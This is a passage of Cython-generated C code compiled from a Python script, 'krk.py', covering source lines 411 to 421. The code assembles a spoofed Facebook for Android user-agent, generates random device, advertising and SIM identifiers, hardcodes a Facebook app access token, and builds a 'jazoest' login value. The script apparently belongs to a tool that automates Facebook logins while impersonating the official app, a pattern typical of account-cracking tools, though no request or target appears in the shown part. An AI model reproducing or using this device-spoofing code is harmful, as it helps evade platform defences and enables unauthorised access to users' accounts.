        __pyx_t_5 = PyNumber_Add(__pyx_kp_s_Davik_2_1_0_Linux_U_Android, __pyx_v_android_version); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_0_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_Build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_build); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAN); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fban); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBAV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbav); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fbbv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDM_density_2_625_width_1080_h); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_v_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBRV); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_randint); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_tuple__74, NULL); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_4, __pyx_t_17); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBCR); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbcr); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBMF); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbmf); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBBD); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBPN); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbpn); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBDV); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbdv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBSV); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s_FBOP_19_FBCA); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyNumber_Add(__pyx_t_17, __pyx_v_fbca); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = PyNumber_Add(__pyx_t_5, __pyx_kp_s__75); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 411, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_ua, __pyx_t_17);
        __pyx_t_17 = 0;

        /* "krk.py":412
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()             # <<<<<<<<<<<<<<
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_random); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 412, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_Random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 412, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_5, };
          __pyx_t_17 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 412, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_17);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_random_seed, __pyx_t_17);
        __pyx_t_17 = 0;

        /* "krk.py":413
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))             # <<<<<<<<<<<<<<
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 */
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_string); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_hexdigits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = PyTuple_New(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_5);
        PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5);
        __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        if (PyDict_SetItem(__pyx_t_5, __pyx_n_s_k, __pyx_int_16) < 0) __PYX_ERR(0, 413, __pyx_L3_error)
        __pyx_t_9 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_t_4, __pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_9); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 413, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_adid, __pyx_t_9);
        __pyx_t_9 = 0;

        /* "krk.py":414
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_uuid); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 414, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 414, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_4))) {
          __pyx_t_5 = PyMethod_GET_SELF(__pyx_t_4);
          if (likely(__pyx_t_5)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
            __Pyx_INCREF(__pyx_t_5);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_4, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_5, };
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 414, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        }
        __pyx_t_4 = __Pyx_PyObject_Str(__pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 414, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_XDECREF_SET(__pyx_v_device_id, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":415
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_n_s_uuid); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 415, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 415, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_9, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 415, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 415, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_secure, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":416
 *                         device_id = str(uuid.uuid4())
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())             # <<<<<<<<<<<<<<
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_uuid); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 416, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_uuid4); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 416, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_4)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_4);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_4, };
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 416, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __pyx_t_9 = __Pyx_PyObject_Str(__pyx_t_5); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 416, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_family, __pyx_t_9);
        __pyx_t_9 = 0;

        /* "krk.py":417
 *                         secure = str(uuid.uuid4())
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_DECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "krk.py":418
 *                         family = str(uuid.uuid4())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))             # <<<<<<<<<<<<<<
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 */
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_random_seed, __pyx_n_s_choices); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_string); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_n_s_digits); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_k, __pyx_int_20) < 0) __PYX_ERR(0, 418, __pyx_L3_error)
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_17); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 418, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_xd, __pyx_t_17);
        __pyx_t_17 = 0;

        /* "krk.py":419
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'             # <<<<<<<<<<<<<<
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)
 */
        __pyx_t_17 = PyTuple_New(3); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 419, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_21 = 0;
        __pyx_t_22 = 127;
        __Pyx_INCREF(__pyx_kp_u__76);
        __pyx_t_21 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__76);
        PyTuple_SET_ITEM(__pyx_t_17, 0, __pyx_kp_u__76);
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_v_xd, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 419, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_17, 1, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u__77);
        __pyx_t_21 += 2;
        __Pyx_GIVEREF(__pyx_kp_u__77);
        PyTuple_SET_ITEM(__pyx_t_17, 2, __pyx_kp_u__77);
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_17, 3, __pyx_t_21, __pyx_t_22); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 419, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __Pyx_XDECREF_SET(__pyx_v_sim_serials, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":420
 *                         xd =str(''.join(random_seed.choices(string.digits, k=20)))
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']             # <<<<<<<<<<<<<<
 *                         li2 = random.choice(li)
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 */
        __pyx_t_4 = PyList_New(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 420, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_INCREF(__pyx_kp_s_28);
        __Pyx_GIVEREF(__pyx_kp_s_28);
        PyList_SET_ITEM(__pyx_t_4, 0, __pyx_kp_s_28);
        __Pyx_INCREF(__pyx_kp_s_29);
        __Pyx_GIVEREF(__pyx_kp_s_29);
        PyList_SET_ITEM(__pyx_t_4, 1, __pyx_kp_s_29);
        __Pyx_INCREF(__pyx_kp_s_210);
        __Pyx_GIVEREF(__pyx_kp_s_210);
        PyList_SET_ITEM(__pyx_t_4, 2, __pyx_kp_s_210);
        __Pyx_XDECREF_SET(__pyx_v_li, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":421
 *                         sim_serials = f'["{xd}"]'
 *                         li = ['28','29','210']
 *                         li2 = random.choice(li)             # <<<<<<<<<<<<<<
 *                         j1 = ''.join(random.choice(digits) for _ in range(2))
 *                         jazoest = li2+j1
 */
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 421, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_choice); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 421, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_5))) {
          __pyx_t_17 = PyMethod_GET_SELF(__pyx_t_5);
          if (likely(__pyx_t_17)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
            __Pyx_INCREF(__pyx_t_17);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_5, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[2] = {__pyx_t_17, __pyx_v_li};
